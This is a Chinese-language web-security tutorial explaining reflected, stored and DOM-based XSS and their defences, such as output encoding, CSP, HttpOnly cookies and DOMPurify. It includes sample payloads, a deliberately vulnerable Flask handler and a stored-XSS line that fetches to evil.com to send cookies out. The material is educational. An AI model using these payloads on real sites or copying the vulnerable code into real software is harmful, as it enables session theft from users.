---
title: "XSS 跨站脚本攻击详解"
date: "2026-05-15"
description: "深入理解 XSS（跨站脚本攻击）的三种类型：反射型、存储型和 DOM 型，以及对应的防御策略。"
category: web-security
tags: ["web安全", "XSS"]
updated: "2026-05-20"
---

## 什么是 XSS

跨站脚本攻击（Cross-Site Scripting，XSS）是最常见的 Web 安全漏洞之一。攻击者通过在目标网站上注入恶意客户端代码，当用户浏览该网站时，恶意代码在用户浏览器中执行。

## XSS 的三种类型

### 1. 反射型 XSS（Reflected XSS）

恶意脚本通过 URL 参数等方式注入，服务端直接反射回响应页面：

```html
<!-- 正常链接 -->
https://example.com/search?q=hello

<!-- 恶意链接 -->
https://example.com/search?q=<script>alert(document.cookie)</script>
```

```python
# 存在漏洞的后端代码
from flask import Flask, request

app = Flask(__name__)

@app.route('/search')
def search():
    query = request.args.get('q', '')
    # 危险：直接将用户输入嵌入 HTML
    return f'<h1>搜索: {query}</h1>'
```

### 2. 存储型 XSS（Stored XSS）

恶意脚本被永久存储在目标服务器上（数据库、留言板等），每次用户访问时都会被加载：

```javascript
// 漏洞场景：留言板没有过滤用户输入
const comment = "<script>fetch('https://evil.com/steal?c=' + document.cookie)</script>";

// 直接将评论存入数据库并渲染在页面上
// 每个查看留言的用户都会被攻击
db.comments.insert({ content: comment });
```

### 3. DOM 型 XSS

恶意脚本通过修改 DOM 环境来执行，不经过服务端：

```javascript
// 漏洞代码
const hash = location.hash.slice(1);
document.getElementById('content').innerHTML = hash;
// 访问: https://example.com/#<img src=x onerror=alert(1)>
```

## XSS 防御策略

### 输出编码

```python
import html

# 对所有用户输入进行 HTML 实体编码
user_input = '<script>alert(1)</script>'
safe_output = html.escape(user_input)
# 结果: &lt;script&gt;alert(1)&lt;/script&gt;
```

### Content Security Policy (CSP)

```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'self'; script-src 'self'; style-src 'self' 'unsafe-inline'">
```

### HttpOnly Cookie

```http
Set-Cookie: session=abc123; HttpOnly; Secure; SameSite=Strict
```

设置了 `HttpOnly` 的 Cookie 无法被 JavaScript 的 `document.cookie` 读取，即使 XSS 攻击成功也无法窃取会话 Cookie。

### 输入验证与过滤

```javascript
// 使用 DOMPurify 库对 HTML 进行消毒
import DOMPurify from 'dompurify';

const dirty = '<img src=x onerror=alert(1)>';
const clean = DOMPurify.sanitize(dirty);
// 结果: <img src="x">
```

## 总结

| XSS 类型 | 攻击向量 | 持久性 | 防御重点 |
|----------|----------|--------|----------|
| 反射型 | URL 参数 | 一次性 | 输出编码 |
| 存储型 | 数据库 | 持久 | 输入过滤 + 输出编码 |
| DOM 型 | 客户端 JS | 页面级 | 安全 DOM API |

**核心原则**：永远不要信任用户输入，所有数据在使用前都要经过验证和编码。
